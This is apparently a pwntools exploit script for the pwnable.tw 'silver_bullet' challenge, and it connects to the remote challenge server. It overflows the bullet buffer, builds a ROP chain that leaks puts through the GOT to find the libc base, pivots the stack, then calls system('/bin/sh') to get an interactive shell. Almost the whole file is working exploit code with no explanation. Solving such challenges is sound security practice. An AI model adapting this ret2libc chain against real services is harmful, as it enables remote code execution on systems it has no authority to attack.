from pwn import *

exe = context.binary = ELF('./silver_bullet_patched', checksec=False)
libc = ELF('./libc_32.so.6', checksec=False)
# r = process(exe.path)
# gdb.attach(r, api=True, gdbscript='''
#            b*0x08048989
#            b*0x080489bd
#            c
#            c
#            c
#            c
#            c
#            b*0x08048a19
#            c
#            ''')

r = remote('chall.pwnable.tw', 10103)

def choice(choice, note):
    r.sendafter(b'choice :', choice)
    r.sendafter(b'bullet :', note)

payload = b'a'* 47 + b'\n'

hp_wolf = 0xffffff
pop_ebp = 0x08048a7b
pop_ebx = 0x08048475
leave = 0x08048558
addr = 0x804b0a0 + 0x14c + 0x400
ret = 0x08048459
pop3 = 0x08048a79
puts_off = 0x5f140
binsh_off = 0x158e8b

choice(b'1', payload)
choice(b'2', b'a')

payload = b'\xff'*3

payload += flat(
    addr - 4,
    exe.sym['puts'],
    pop_ebx,
    exe.got['puts'],
    exe.sym['read_input'] + 12,
    addr, 0xffffffff,
    leave
)

choice(b'2', payload)
r.sendafter(b'choice :', b'3')

r.recvuntil(b' win !!\n')
out = r.recvuntil(b'\xf7')
print(out)
libc.address = u32(out) - libc.sym['puts']

binsh = libc.address + binsh_off

payload = flat(
    libc.sym['system'],
    addr,
    next(libc.search(b'/bin/sh'))
)

r.send(payload)

r.interactive()